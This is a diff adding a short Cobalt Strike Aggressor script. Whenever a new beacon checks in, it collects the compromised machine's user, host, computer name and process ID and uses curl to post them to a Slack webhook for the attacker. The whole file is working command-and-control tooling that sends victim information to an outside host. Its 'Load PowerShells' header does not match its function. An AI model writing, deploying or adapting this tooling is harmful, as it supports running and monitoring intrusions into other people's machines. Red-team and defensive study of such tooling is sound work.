@@ -1,0 +1,25 @@
+#### Load PowerShells
+## Aggressor script to send slack notification whith basic beacon's info on a new beacon initial call
+###  Author: Sabri (@KINGSABRI)
+
+### Usage ###
+# 1. Edit $teamserver, $slack_webhook, $slack_webhook
+# 2. run it as a headless: ./agscript 127.0.0.1 50050 SlackNotify PASSWORD slack-notify.cna
+### Output ###
+# Check your slack ;)
+
+
+$teamserver    = "Main C2";
+$slack_channel = "#Hell";
+$slack_webhook = "https://hooks.slack.com/services/XXX/YYY/ZZZ";
+
+on beacon_initial {
+  $beacon   = binfo($1);
+  $user     = $beacon['user'];
+  $host     = $beacon['host'];
+  $computer = $beacon['computer'];
+  $pid      = $beacon['pid'];
+  $message  = 'payload={"attachments": [{"color": "danger","author_name": "' . $teamserver . '", "fallback": "New Beacon ' . $teamserver . ' | ' . $pid . '", "fields": [{"title": "' . $user . '@' . $host . ' (' . $computer . ')","short": false}],"footer": "PID: ' . $pid . '"}]}';
+  @curl_command = @('curl','-X','POST','--data-urlencode', $message, $slack_webhook);
+  exec(@curl_command);
+}
